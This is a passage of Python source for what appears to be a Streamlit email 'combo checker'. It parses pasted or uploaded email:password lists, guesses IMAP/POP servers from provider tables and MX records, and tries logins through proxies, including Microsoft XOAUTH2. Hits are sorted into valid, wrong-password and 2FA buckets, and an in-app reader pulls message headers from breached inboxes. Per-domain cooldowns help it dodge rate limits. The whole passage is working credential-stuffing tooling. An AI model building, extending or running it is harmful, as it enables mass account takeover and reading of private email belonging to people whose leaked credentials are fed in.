            resolvable = True
    except Exception:
        resolvable = False
    with cache_lock:
        domain_cache.setdefault(domain, {})["resolvable"] = resolvable
    if persist:
        save_domain_cache()
    return resolvable
# @@END 084 DOMAIN_RESOLVE

# @@BLOCK 085 PREV_VALID_IO deps=037,038
def load_previous_valid():
    now = time.time()
    if _PREV_VALID_CACHE["data"] and (now - _PREV_VALID_CACHE["ts"]) < 20.0:
        return set(_PREV_VALID_CACHE["data"])
    seen = set()
    try:
        _res = user_file("mail_results")
        paths = sorted(glob.glob(os.path.join(_res, "valid_*.txt")), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            _p = user_file(extra)
            if os.path.exists(_p):
                paths.append(_p)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and "@" in email:
                                seen.add(email)
            except Exception:
                continue
        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
    except Exception as e:
        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
    _PREV_VALID_CACHE["ts"] = now
    _PREV_VALID_CACHE["data"] = set(seen)
    return seen


def _domains_in_text(text):
    out = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        em = line.split(":", 1)[0].strip().lower()
        if "@" in em:
            d = em.split("@")[-1]
            if d and d not in out:
                out.append(d)
    return out
# @@END 085 PREV_VALID_IO

# @@BLOCK 086 PROCESS_ACCOUNTS deps=021,038,058,068,082,084,085
def process_accounts(text, previous_valid):
    lines = []
    disp_list, typo_list, resume_list, app_skip_list, custom_list = [], [], [], [], []
    dns_fail_list, smtp_fail_list = [], []
    whitelist = CFG.get("CUSTOM_WHITELIST", [])
    blacklist = CFG.get("CUSTOM_BLACKLIST", [])

    for line in text.splitlines():
        line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        parts = line.split(":", 1)
        email = parts[0].strip().lower()
        password = parts[1].strip() if len(parts) > 1 else ""
        if not email or "@" not in email or not password:
            continue
        if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
            continue
        domain = email.split("@")[-1].lower()
        if whitelist and domain not in whitelist:
            custom_list.append(line)
            continue
        if blacklist and domain in blacklist:
            custom_list.append(line)
            continue
        if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
            app_skip_list.append(line)
            continue
        if is_disposable(email):
            disp_list.append(line)
            continue
        if domain in COMMON_TYPOS:
            typo_list.append(line)
            continue
        if email in previous_valid:
            resume_list.append(line)
            continue
        if ".." in email or email.count("@") != 1:
            continue
        if not check_domain_resolvable(domain, persist=False):
            dns_fail_list.append(line)
            continue
        lines.append(f"{email}:{password}")

    save_domain_cache()

    if CFG.get("SMTP_CHECK", False) and lines:
        domains = list(dict.fromkeys(l.split(":", 1)[0].split("@")[-1].lower()
                                     for l in lines if "@" in l))
        results = smtp_precheck_domains(domains)
        keep = []
        for l in lines:
            d = l.split(":", 1)[0].split("@")[-1].lower()
            if results.get(d) is False:
                smtp_fail_list.append(l)
            else:
                keep.append(l)
        lines = keep
        dead = sum(1 for v in results.values() if v is False)
        log_startup(f"SMTP pre-check: {len(results)} domain(s) probed, {dead} dead, "
                    f"{len(smtp_fail_list)} account(s) bucketed.")

    seen_email, clean = set(), []
    for line in lines:
        em = line.split(":", 1)[0].strip().lower()
        if em not in seen_email:
            seen_email.add(em)
            clean.append(line)

    log_startup(
        f"Processed account input. Clean valid count ready: {len(clean)} "
        f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
    )
    return (clean, disp_list, typo_list, resume_list, app_skip_list, custom_list,
            dns_fail_list, smtp_fail_list)
# @@END 086 PROCESS_ACCOUNTS

# @@BLOCK 087 INPUT_UI deps=034,035,055,082,083,085,086
# ---- single BUCKET table (was RESULT_INSPECT + RESULT_ACTION_MODES duplicated) ----
PREFILTER_LABELS = [
    "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
    "Skip previously valid", "App-Skipped", "Custom Filtered",
    "DNS Failed", "SMTP Failed",
]
BUCKETS = [
    ("✅ Valid Found", "valid_results"),
    ("❌ Wrong Password Found", "wrong_results"),
    ("🔐 App Password / 2FA Found", "need_app_results"),
    ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),
    ("🕓 RETRY_LATER Found", "retry_results"),
    ("🚫 RBL Blocked Found", "rbl_results"),
    ("🔌 Connection Failed Found", "conn_results"),
    ("🩹 Proxy Unhealthy Found", "proxy_results"),
    ("⏭ Skipped / Filtered Found", "skip_results"),
    ("❓ Unclassified Found", "unknown_results"),
]
BUCKET_TAGS = {
    "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
    "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
    "need_app_results": "NEED_APP_PASSWORD", "login_drop_results": "LOGIN_DROPPED",
    "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
    "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
    "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
}

section_title("📥", "Accounts Input & Pre-Filtering",
              "paste combos or upload a file - junk is filtered before the engine runs")

input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""
with input_tab1:
    raw_text = str_lit.text_area(
        "Paste accounts here (email:password format):",
        placeholder="user@example.com:password123", height=150,
        key="bb_raw_text")          # FIX P1-2: a key stops the paste vanishing
with input_tab2:
    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"],
                                          key="bb_upload")   # FIX P1-2
    if uploaded_file is not None:
        try:
            file_bytes = uploaded_file.getvalue()
            if not file_bytes:
                str_lit.warning("Uploaded file is empty.")
                raw_text = ""
            else:
                try:
                    raw_text = file_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    raw_text = file_bytes.decode("latin-1", errors="ignore")
                str_lit.success("File uploaded successfully!")
        except Exception as e:
            str_lit.error(f"Failed decoding uploaded file: {e}")
            raw_text = ""

clean_lines = []
disp, typo, resume, app_skip, custom_skipped, dns_skipped, smtp_skipped = [], [], [], [], [], [], []
skip_previous = str_lit.checkbox(
    "Skip previously valid", value=True,
    help="On: lines already in old valid files are not checked again.")

if raw_text:
    previous_valid = load_previous_valid() if skip_previous else set()

    _pf_fp = (
        len(raw_text), hash(raw_text), bool(skip_previous), len(previous_valid),
        tuple(CFG.get("CUSTOM_WHITELIST", [])), tuple(CFG.get("CUSTOM_BLACKLIST", [])),
        bool(CFG.get("FAST_MODE")), bool(CFG.get("SKIP_STRICT_APP_PROVIDERS")),
        bool(CFG.get("SMTP_CHECK")),
    )
    _pf_cache = str_lit.session_state.get("_bb_prefilter_cache") or {}
    _pf_data = _pf_cache.get("data") if _pf_cache.get("fp") == _pf_fp else None
    if _pf_data is None:
        try:
            _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
                             if CFG.get("SMTP_CHECK", False) else [])
            if _pending_smtp:
                with str_lit.spinner(f"🛰 SMTP reachability pre-check on "
                                     f"{len(_pending_smtp)} new domain(s)..."):
                    _pf_data = process_accounts(raw_text, previous_valid)
            else:
                _pf_data = process_accounts(raw_text, previous_valid)
        except Exception as _pf_err:
            str_lit.exception(_pf_err)
            _pf_data = ([], [], [], [], [], [], [], [])
        str_lit.session_state["_bb_prefilter_cache"] = {"fp": _pf_fp, "data": _pf_data}
    (clean_lines, disp, typo, resume, app_skip,
     custom_skipped, dns_skipped, smtp_skipped) = _pf_data

    str_lit.session_state.pre_dns_failed = list(dns_skipped)
    str_lit.session_state.pre_smtp_failed = list(smtp_skipped)

    # FIX RS-2: this counted FILES (there is only ever one) and read a glob that
    # raised TypeError, so it read 0 no matter what was on disk. It now counts
    # the resumable LINES, which is what the label promises and what the row of
    # neighbouring account counts means.
    unfinished_count = unfinished_remaining_count()
    _pf_metrics = [
        ("Ready to Check", len(clean_lines)),
        ("Resume Unfinished", unfinished_count),
        ("Disposables", len(disp)),
        ("Typos", len(typo)),
        ("Skip previously valid", len(resume)),
        ("App-Skipped", len(app_skip)),
        ("Custom Filtered", len(custom_skipped)),
        ("DNS Failed", len(dns_skipped)),
        ("SMTP Failed", len(smtp_skipped)),
    ]
    for _pc, (_pl, _pv) in zip(metric_grid(_pf_metrics, per_row=3), _pf_metrics):
        _pc.metric(_pl, _pv)

    section_title("🔍", "Filter & Result Categories Inspector",
                  "inspect any bucket, including DNS Failed and SMTP Failed")

    inspect_options = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

    filter_category_choice = str_lit.selectbox(
        "Select category to inspect contents:", options=inspect_options,
        key="bb_inspect_cat")

    # FIX RS-3: the preview used to append a metadata line per run into the SAME
    # list as the account lines, so "Showing N items" counted headers too. The
    # metadata is a caption now and the list holds account lines only.
    unfinished_runs = list_unfinished_runs()
    unfinished_preview = []
    for run in unfinished_runs:
        unfinished_preview.extend(run.get("remaining") or [])
    if unfinished_runs:
        _r0 = unfinished_runs[0]
        str_lit.caption(
            f"Record: {_r0.get('saved_at', '?')} | reason: {_r0.get('reason', '?')} | "
            f"{_r0.get('checked', 0)}/{_r0.get('total', 0)} checked at stop")

    category_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": unfinished_preview,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    _inspect_to_key = dict(BUCKETS)
    if filter_category_choice in _inspect_to_key:
        category_map[filter_category_choice] = list(
            str_lit.session_state.get(_inspect_to_key[filter_category_choice], []))

    selected_list_items = category_map.get(filter_category_choice, [])
    if selected_list_items:
        str_lit.info(f"Showing **{len(selected_list_items)}** items for "
                     f"**{filter_category_choice}**:")
        str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
    else:
        str_lit.info(f"No items in **{filter_category_choice}**.")
# @@END 087 INPUT_UI

# @@BLOCK 088 PROVIDER_TABLES deps=002,052
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btinternet.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "bt.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btopenworld.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "talk21.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "sky.com": {"imap": ["imap.tools.sky.com"], "pop": ["imap.tools.sky.com"], "pop3": ["imap.tools.sky.com"]},
    "virginmedia.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "ntlworld.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "blueyonder.co.uk": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]},
}
PARENT_PROVIDER_MAPPINGS = PARENT


def get_mx_hosts(domain):
    if not dns:
        return []
    try:
        return [str(r.exchange).lower().rstrip(".")
                for r in sorted(dns.resolver.resolve(domain, "MX"),
                                key=lambda x: x.preference)]
    except Exception:
        return []


def detect_parent_provider(domain):
    if domain in PARENT_PROVIDER_MAPPINGS:
        return PARENT_PROVIDER_MAPPINGS[domain]
    for m in get_mx_hosts(domain):
        ml = m.lower()
        if "biglobe" in ml:
            return "biglobe.ne.jp"
        if "google" in ml or "gmail" in ml:
            return "gmail.com"
        if "outlook" in ml or "protection.outlook" in ml:
            return "outlook.office365.com"
        if "yahoo" in ml:
            return "yahoo.com"
    return None
# @@END 088 PROVIDER_TABLES

# @@BLOCK 089 MX_PARENT deps=088
def _location_tokens_from_mx(mx_records, domain):
    toks = []
    for mx in (mx_records or [])[:3]:
        for part in re.split(r"[.\-]", mx or ""):
            p = part.strip().lower()
            if not p or p in toks or p in domain or p in ("com", "net", "org",
                                                          "edu", "gov", "co", "mail"):
                continue
            if re.match(r"^(mx|mta|smtp|relay|inbound|outbound|zcs|srv|edge|filter|"
                        r"cluster|mailrouter)\d*$", p):
                continue
            toks.append(p)
    return toks[:1]


def _expand_cnames(hosts, limit=6):
    if not dns:
        return list(hosts)
    out = []
    for h in hosts:
        if h not in out:
            out.append(h)
        if len(out) >= limit:
            break
        try:
            for r in dns.resolver.resolve(h, "CNAME", lifetime=2):
                t = str(r.target).rstrip(".").lower()
                if t and t not in out:
                    out.append(t)
        except Exception:
            pass
    return out
# @@END 089 MX_PARENT

# @@BLOCK 090 CANDIDATE_GEN deps=002,088,089
def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
    candidates = []
    dl = domain.lower()
    if "charter" in dl:
        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
    elif "spectrum" in dl:
        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
    elif "twc" in dl:
        candidates.extend(["mail.twc.com"])

    for prefix in ['imap', 'mail', 'webmail', 'imaps', 'correo', 'secure', 'email']:
        candidates.append(f"{prefix}.{domain}")

    for tok in _location_tokens_from_mx(mx_records, domain):
        for prefix in ['mail', 'imap', 'pop3', 'pop']:
            candidates.append(f"{prefix}-{tok}.{domain}")

    candidates.append(domain)

    for mx in (mx_records or []):
        candidates.append(mx)
        parts = mx.split('.')
        if len(parts) >= 2:
            parent = f"{parts[-2]}.{parts[-1]}"
            if parent != domain:
                for prefix in ['imap', 'mail', 'pop', 'pop3']:
                    candidates.append(f"{prefix}.{parent}")

    return _expand_cnames(list(dict.fromkeys(candidates)))


def known_provider_conf(domain):
    return host_conf(domain)


def drop_before_check(email):
    email = (email or "").strip().lower()
    if email.count("@") != 1:
        return "bad format"
    local, domain = email.split("@", 1)
    if "http" in local or "login.live" in local or not local or "." not in domain:
        return "bad format"
    if any(p in domain for p in ("tempmail", "guerrillamail", "mailinator", "yopmail",
                                 "trashmail", "rerttymail", "10minutemail", "throwaway")):
        return "disposable"
    return ""


def host_resolves(host):
    if not host:
        return False
    with _host_dns_lock:
        cached = _host_dns_cache.get(host)
    if cached is not None:
        return cached
    ok = False
    try:
        if dns:
            try:
                dns.resolver.resolve(host, "A", lifetime=2)
                ok = True
            except Exception:
                try:
                    dns.resolver.resolve(host, "AAAA", lifetime=2)
                    ok = True
                except Exception:
                    pass
        if not ok:
            socket.gethostbyname(host)
            ok = True
    except Exception:
        ok = False
    with _host_dns_lock:
        _host_dns_cache[host] = ok
    return ok
# @@END 090 CANDIDATE_GEN

# @@BLOCK 091 HOST_RANK deps=003,090
def _is_junk_host(host, domain):
    return host_is_junk(host, domain)


def _rank_hosts(hosts, domain):
    return host_rank_hosts(hosts, domain)
# @@END 091 HOST_RANK

# @@BLOCK 092 DOMAIN_ROOTS deps=003,090,091
_LOCAL_PRIORITY_IMAP = ("imap.", "mail.", "email.", "")
_LOCAL_PRIORITY_POP = ("pop.", "pop3.", "")

_DOMAIN_ALIAS_ROOTS = {
    "xplornet.com": ("xplore.net",),
    "xplore.net":   ("xplornet.com",),
}


def _domain_roots(domain):
    domain = (domain or "").lower().strip()
    roots = [domain] if domain else []
    for alt in _DOMAIN_ALIAS_ROOTS.get(domain, ()):
        if alt and alt not in roots:
            roots.append(alt)
    return roots


def _is_local_domain_host(host, domain):
    h = (host or "").lower().strip()
    if not h:
        return False
    for root in _domain_roots(domain):
        if h == root or h.endswith("." + root):
            return True
    return False


def _guess_candidates(domain, prefixes):
    out = []
    roots = _domain_roots(domain)
    if not roots:
        return out
    for root in roots:
        for pfx in prefixes:
            cand = f"{pfx}{root}" if pfx else root
            if cand and cand not in out and host_resolves(cand):
                out.append(cand)
    return out


def _family_priority(domain):
    """Curated family endpoint for this domain (delegates to hosts.py)."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_family_priority(domain)
        except Exception:
            pass
    return []


def _merge_domain_guesses(servers, domain):
    """Delegate to hosts.py so FAMILY_PRIORITY is honoured."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_merge_guesses(servers, domain)
        except Exception:
            pass
    if not servers or not domain:
        return servers

    out = dict(servers)
    for key, priority in (("imap", _LOCAL_PRIORITY_IMAP),
                          ("pop", _LOCAL_PRIORITY_POP),
                          ("pop3", _LOCAL_PRIORITY_POP)):
        hosts = [h for h in (out.get(key) or []) if h]
        if not hosts:
            continue

        family = _family_priority(domain)
        local_priority = _guess_candidates(domain, priority)
        priority_set = set(local_priority) | set(family)

        local_other = [h for h in hosts
                       if h not in priority_set and _is_local_domain_host(h, domain)]
        local_other_set = set(local_other)

        foreign = [h for h in hosts
                   if h not in priority_set and h not in local_other_set]

        merged = []
        for h in family + local_priority + local_other + foreign:
            if h and h not in merged:
                merged.append(h)
        out[key] = merged
    return out
# @@END 092 DOMAIN_ROOTS

# @@BLOCK 093 GET_SERVERS deps=002,088,090,091,092
def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}

        known = known_provider_conf(domain)
        if known:
            if known.get("imap"):
                known["imap"] = _rank_hosts(known["imap"], domain)
            if known.get("pop"):
                known["pop"] = _rank_hosts(known["pop"], domain)
            return _merge_domain_guesses(known, domain)

        with cache_lock:
            cached = domain_cache.get(domain) or {}
        if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
            return _merge_domain_guesses({
                "imap": list(cached["imap"]),
                "pop": list(cached.get("pop") or cached["imap"]),
                "pop3": list(cached.get("pop3") or cached["imap"]),
            }, domain)

        parent_domain = detect_parent_provider(domain)
        if parent_domain in ("yahoo.com", "gmail.com"):
            res = _merge_domain_guesses(known_provider_conf(parent_domain), domain)
            if res:
                return res
        if parent_domain == "outlook.office365.com":
            res = _merge_domain_guesses(known_provider_conf("outlook.com"), domain)
            if res:
                return res
        if parent_domain == "biglobe.ne.jp":
            return _merge_domain_guesses(
                {"imap": ["mail.biglobe.ne.jp"], "pop": ["mail.biglobe.ne.jp"],
                 "pop3": ["mail.biglobe.ne.jp"]}, domain)

        if domain in PROVIDER_MAP:
            return _merge_domain_guesses(PROVIDER_MAP[domain], domain)

        mx_records = get_mx_hosts(domain) if parent_domain not in PARENT_PROVIDER_MAPPINGS else []
        candidate_hosts = _rank_hosts(generate_candidate_hosts(domain, mx_records), domain)
        servers = {"imap": candidate_hosts, "pop": candidate_hosts, "pop3": candidate_hosts}

        with cache_lock:
            domain_cache.setdefault(domain, {})
            domain_cache[domain].update({
                "imap": servers["imap"], "pop": servers["pop"], "pop3": servers["pop3"],
                "ts": time.time(),
            })
        save_domain_cache()
        return _merge_domain_guesses(servers, domain)
    except Exception as e:
        warnings.warn(f"Error resolving servers for {email}: {e}")
        d = email.split('@')[-1] if '@' in email else 'localhost'
        fp = generate_candidate_hosts(d, [])
        return _merge_domain_guesses({"imap": fp, "pop": fp, "pop3": fp}, d)
# @@END 093 GET_SERVERS

# @@BLOCK 094 USERNAME_CANDIDATES deps=-
def username_candidates(email):
    email = (email or "").strip()
    if not email:
        return [email]
    out = [email]
    if "@" in email:
        local = email.split("@", 1)[0].strip()
        if local and local.lower() != email.lower():
            out.append(local)
    return list(dict.fromkeys(out))
# @@END 094 USERNAME_CANDIDATES

# @@BLOCK 095 IMAP_ATTEMPTS deps=063,064
def imap_once(email, password, server, proxy_str=None, insecure=None, port=993,
              attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP post-auth inbox select failed "
                               f"(possible proxy spoofing): {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_starttls_once(email, password, server, proxy_str=None, insecure=None, port=143,
                       attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
# @@END 095 IMAP_ATTEMPTS

# @@BLOCK 096 POP_ATTEMPTS deps=063
def pop_once(email, password, server, proxy_str=None, insecure=None, port=995,
             attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 post-auth stat failed (possible proxy spoofing)")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_starttls_once(email, password, server, proxy_str=None, insecure=None, port=110,
                      attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        mail.stls(context=_tls_context(server, verify=not insecure))
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 STLS user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 STLS password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 STLS post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 plain invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 plain user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 plain password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 plain post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass
# @@END 096 POP_ATTEMPTS

# @@BLOCK 097 VERIFY_AND_CONNECT deps=005,022,061,063,064,093,094
def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
    """Used by the in-app Mailbox Reader."""
    users = username_candidates(target_email)
    _ins = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    for h in hosts:
        if MS_OAUTH_OK and h.lower() in ms_oauth.MS_IMAP_HOSTS:
            try:
                mail, _exists, _claims = ms_oauth.imap_xoauth2_open(
                    target_email, target_pass, h, ProxyIMAP4SSL,
                    port=993, proxy_str=proxy_str,
                    insecure=_ins, attempt_timeout=15)
                return True, mail, h
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict in ("wrong_password", "need_app_password"):
                    raise MsVerdict(tr.verdict,
                                    f"Microsoft XOAUTH2 {tr.code} -> {tr.verdict}")
            except Exception:
                pass

        for mode, port in (("ssl", 993), ("starttls", 143), ("plain", 143)):
            for user in users:
                mail = None
                try:
                    if mode == "ssl":
                        mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str,
                                             insecure=_ins)
                    elif mode == "starttls":
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                        mail.starttls(ssl_context=_tls_context(h, verify=not _ins))
                    else:
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                    _imap_auth(mail, user, target_pass)
                    st_typ, _ = mail.select("INBOX", readonly=True)
                    if st_typ == 'OK':
                        return True, mail, h
                    try:
                        mail.logout()
                    except Exception:
                        pass
                except Exception:
                    if mail:
                        try:
                            mail.logout()
                        except Exception:
                            pass
                    continue
    return False, None, ""
# @@END 097 VERIFY_AND_CONNECT

# @@BLOCK 098 READ_MAILBOX deps=022,093,097
def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
    mail = None
    try:
        conf_hosts = get_servers(email).get("imap", []) or [server]
        verified, mail, _ = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
        if not verified or not mail:
            return ["Error reading mailbox: True credential verification failed."]
        mail.select("INBOX")
        typ, data = mail.search(None, "ALL")
        if typ != "OK":
            return ["No messages or folder empty."]
        ids = data[0].split()
        latest_ids = ids[-limit:] if len(ids) > limit else ids
        messages = []
        for mid in reversed(latest_ids):
            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ == "OK":
                for rp in msg_data:
                    if isinstance(rp, tuple):
                        messages.append(rp[1].decode("utf-8", errors="ignore"))
        try:
            mail.logout()
        except Exception:
            pass
        return messages if messages else ["No recent messages found."]
    except MsVerdict as mv:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return [f"Error reading mailbox: Microsoft token verdict -> {mv.verdict} ({mv})"]
    except Exception as e:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return [f"Error reading mailbox: {str(e)}"]
# @@END 098 READ_MAILBOX

# @@BLOCK 099 CHECK_WRAPPER deps=009,023
def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    """Thin FAST_MODE cooldown wrapper around _check_account_core().

    Stamping in ONE place, for INCONCLUSIVE outcomes only, makes it predictable:
    a domain is backed off when it told us NOTHING, and never when it gave a real
    answer (VALID / WRONG / NEED_APP_PASSWORD / LOGIN_DROPPED / RBL).
    """
    if trace_logs is None:
        trace_logs = []

    if not CFG.get("FAST_MODE", True):
        return _check_account_core(email, password, conf, domain, proxy_pool,
                                   thread_state, trace_logs)

    ts = failed_domain_cache.get(domain)
    if ts and (time.time() - ts) < CFG.get("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT):
        trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. "
                          f"Skipping immediately.")
        return None, SKIP, SKIP, None, trace_logs
    if ts:
        failed_domain_cache.pop(domain, None)

    out = _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs)
    try:
        _status = out[1]
    except Exception:
        _status = None
    if _status in (FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY, RETRY, RETRY_LATER,
                   UNKNOWN, DNS_FAILED, SMTP_FAILED):
        failed_domain_cache[domain] = time.time()
        trace_logs.append(
            f"Fast Mode: domain '{domain}' armed for cooldown "
            f"({CFG.get('FAILURE_COOLDOWN', FAILURE_COOLDOWN_DEFAULT)}s) after an "
            f"inconclusive result [{_status}].")
    return out
# @@END 099 CHECK_WRAPPER

